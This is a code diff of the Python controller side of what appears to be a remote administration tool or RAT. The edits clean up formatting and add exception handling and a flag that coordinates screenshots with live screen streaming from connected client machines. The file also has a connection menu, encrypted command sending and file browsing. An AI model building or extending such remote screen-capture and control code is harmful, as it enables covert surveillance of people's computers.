@@ -1,4 +1,4 @@
-import socket, os, time, threading, sys, json,io
+import socket, os, time, threading, sys, json, io
 from queue import Queue
 
 import numpy as np
@@ -29,10 +29,14 @@ send = lambda data: conn.send(objEncryptor.encrypt(data))
 recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))
 
 # boolean to manage stream-state
-stream_active=False
+stream_active = False
 
-#stream title
-streamTitle=""
+# solo usage
+solousage = True
+
+# stream title
+streamTitle = ""
+
 
 def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
@@ -121,7 +125,7 @@ def main_menu():
             list_connections()
 
         elif strChoice[:1] == "i" and len(strChoice) > 1:
-           # print("trigger "+strChoice[2:])
+            # print("trigger "+strChoice[2:])
             conn = select_connection(strChoice[2:], True)
             if conn is not None:
                 send_commands()
@@ -216,7 +220,7 @@ def select_connection(connection_id, blnGetResponse):
         if blnGetResponse:
             print(f"You are connected to {arrInfo[0]} ....\n")
         global streamTitle
-        streamTitle=arrInfo[0]  + " "+ arrInfo[1] + " "+ arrInfo[2]
+        streamTitle = arrInfo[0] + " " + arrInfo[1] + " " + arrInfo[2]
         return conn
 
 
@@ -237,53 +241,72 @@ def user_info():
 
 
 def screenshot():
-    send(b"screen")
-    strScrnSize = recv(intBuff).decode()  # get screenshot size
-    print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
+    global solousage
+    solousage = False
+  #  clear_buffer(objSocket)
+    try:
+        send(b"screen")
+        strScrnSize = recv(intBuff).decode()  # get screenshot size
+        print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
 
-    intBuffer = int(strScrnSize)
+        intBuffer = int(strScrnSize)
 
-    strFile = time.strftime("%Y%m%d%H%M%S.png")
+        strFile = time.strftime("%Y%m%d%H%M%S.png")
 
-    ScrnData = recvall(intBuffer)  # get data and write it
-    with open(strFile, "wb") as objPic:
-        objPic.write(ScrnData)
+        ScrnData = recvall(intBuffer)  # get data and write it
+        with open(strFile, "wb") as objPic:
+            objPic.write(ScrnData)
 
-    print(f"Done!\nTotal bytes received: {os.path.getsize(strFile)} bytes")
+        print(f"Done!\nTotal bytes received: {os.path.getsize(strFile)} bytes")
+        solousage= True
+    except: screenshot()
+
 
 def stream_screen_start():
     def thread_function():
 
         global stream_active
-        stream_active= True
+        stream_active = True
+        print("start stream...")
         while stream_active:
+          #  print("soloUsage "+str(solousage))
+          #  print("stream_active "+str(stream_active))
+            try:
 
+                if solousage:
+                    send(b"stream start")
+                    strScrnSize = recv(intBuff).decode()  # get screenshot size
+                    # print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
 
-                                    send(b"stream start")
-                                    strScrnSize = recv(intBuff).decode()  # get screenshot size
-                                    #print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
+                    intBuffer = int(strScrnSize)
+                    global streamingframeSize
+                    streamingframeSize = intBuffer
+                    strFile = time.strftime("last.png")
 
-                                    intBuffer = int(strScrnSize)
+                    frame = recvall(intBuffer)  # get data and write it
 
-                                    strFile = time.strftime("last.png")
+                    nparr = np.frombuffer(frame, np.uint8)
+                    image = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+                    cv2.imshow(streamTitle, image)
+                    cv2.waitKey(1)
 
-                                    frame = recvall(intBuffer)  # get data and write it
-
-                                    nparr = np.fromstring(frame, np.uint8)
-                                    image = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-                                    cv2.imshow(streamTitle, image)
-                                    cv2.waitKey(1)
-
-
+            except:
+                pass
+        print("STREAM INACTIVE")
     x = threading.Thread(target=thread_function, args=())
-  #  logging.info("Main    : before running thread")
+    #  logging.info("Main    : before running thread")
     x.start()
-
 
 
 def stream_screen_stop():
     global stream_active
     stream_active = False
+
+def clear_buffer(sock):
+    try:
+        while sock.recv(1024+intBuff+1+streamingframeSize): pass
+    except:
+        pass
 
 def browse_files():
     send(b"filebrowser")
